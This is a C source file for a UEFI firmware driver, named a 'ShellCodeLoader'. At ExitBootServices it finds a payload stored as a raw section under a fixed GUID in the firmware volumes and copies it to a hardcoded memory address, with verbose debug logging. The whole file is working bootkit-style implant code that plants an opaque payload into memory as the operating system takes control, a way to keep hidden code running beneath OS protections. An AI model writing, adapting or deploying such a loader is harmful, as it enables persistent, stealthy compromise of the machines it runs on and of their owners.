#include <Library/BaseLib.h>
#include <Library/DebugLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiLib.h>
#include <Library/IoLib.h>
#include <Protocol/FirmwareVolume2.h>
#include <Library/BaseMemoryLib.h>

EFI_EVENT EfiExitBootServicesEvent      = (EFI_EVENT)NULL;
STATIC EFI_GUID gPayloadGuid =
 { 0x25462CDA, 0x221F, 0x47DF, { 0xAC, 0x1D, 0x25, 0x9C, 0xFA, 0xA4, 0xE3, 0xFF } };

VOID
LoadPayLoadIntoMemory(UINT8* LoadAddr)
{
  EFI_STATUS Status;
  EFI_HANDLE *HandleBuffer = NULL;
  UINTN HandleCount = 0;
  EFI_FIRMWARE_VOLUME2_PROTOCOL *Fv;
  VOID *Buffer = NULL;
  UINTN BufferSize = 0;
  UINT32 AuthStatus;

  DEBUG((EFI_D_ERROR, "[Payload] Starting load\n"));
  DEBUG((EFI_D_ERROR, "[Payload] Target address: 0x%p\n", LoadAddr));

  Status = gBS->LocateHandleBuffer(
                  ByProtocol,
                  &gEfiFirmwareVolume2ProtocolGuid,
                  NULL,
                  &HandleCount,
                  &HandleBuffer
                  );

  if (EFI_ERROR(Status)) {
    DEBUG((EFI_D_ERROR, "[Payload] LocateHandleBuffer failed: %r\n", Status));
    return;
  }

  DEBUG((EFI_D_ERROR, "[Payload] Found %u FV handles\n", HandleCount));

  for (UINTN i = 0; i < HandleCount; i++) {

    DEBUG((EFI_D_ERROR, "[Payload] Checking FV[%u]\n", i));

    Status = gBS->HandleProtocol(
                    HandleBuffer[i],
                    &gEfiFirmwareVolume2ProtocolGuid,
                    (VOID**)&Fv
                    );

    if (EFI_ERROR(Status)) {
      DEBUG((EFI_D_ERROR, "[Payload] HandleProtocol failed on FV[%u]: %r\n", i, Status));
      continue;
    }

    DEBUG((EFI_D_ERROR, "[Payload] Attempting ReadSection on FV[%u]\n", i));

    Status = Fv->ReadSection(
                    Fv,
                    &gPayloadGuid,
                    EFI_SECTION_RAW,
                    0,
                    &Buffer,
                    &BufferSize,
                    &AuthStatus
                    );

    if (!EFI_ERROR(Status)) {
      DEBUG((EFI_D_ERROR, "[Payload] Payload found in FV[%u]\n", i));
      DEBUG((EFI_D_ERROR, "[Payload] Buffer: 0x%p Size: 0x%lx\n", Buffer, BufferSize));
      break;
    } else {
      DEBUG((EFI_D_ERROR, "[Payload] ReadSection failed on FV[%u]: %r\n", i, Status));
    }
  }

  if (EFI_ERROR(Status) || Buffer == NULL || BufferSize == 0) {
    DEBUG((EFI_D_ERROR, "[Payload] Failed to locate payload in any FV\n"));
    return;
  }

  DEBUG((EFI_D_ERROR, "[Payload] Copying payload to 0x%p (size: 0x%lx)\n", LoadAddr, BufferSize));

  CopyMem(LoadAddr, Buffer, BufferSize);

  DEBUG((EFI_D_ERROR, "[Payload] Copy complete\n"));
}

VOID
EFIAPI
ExitBootServicesEvent (
  IN EFI_EVENT  Event,
  IN VOID       *Context
  )
{
  LoadPayLoadIntoMemory((UINT8 *)0x1334FFD4);
}

EFI_STATUS 
EFIAPI 
ShellCodeLoaderInit(
  IN EFI_HANDLE ImageHandle, 
  IN EFI_SYSTEM_TABLE *SystemTable) 
{
  EFI_STATUS Status = EFI_SUCCESS;

  // Register for an ExitBootServicesEvent
  Status = gBS->CreateEvent(EVT_SIGNAL_EXIT_BOOT_SERVICES, TPL_NOTIFY, ExitBootServicesEvent, NULL, &EfiExitBootServicesEvent);
  ASSERT_EFI_ERROR(Status);

  return Status;
}